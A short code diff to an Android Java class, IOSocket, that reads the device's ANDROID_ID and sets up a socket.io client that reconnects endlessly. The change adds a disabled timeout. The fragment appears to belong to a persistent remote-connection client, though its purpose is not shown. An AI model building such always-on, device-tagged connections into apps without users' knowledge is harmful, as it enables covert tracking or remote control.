@@ -21,6 +21,7 @@ public class IOSocket {
 
             String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
             IO.Options opts = new IO.Options();
+            opts.timeout = -1;
             opts.reconnection = true;
             opts.reconnectionDelay = 5000;
             opts.reconnectionDelayMax = 999999999;
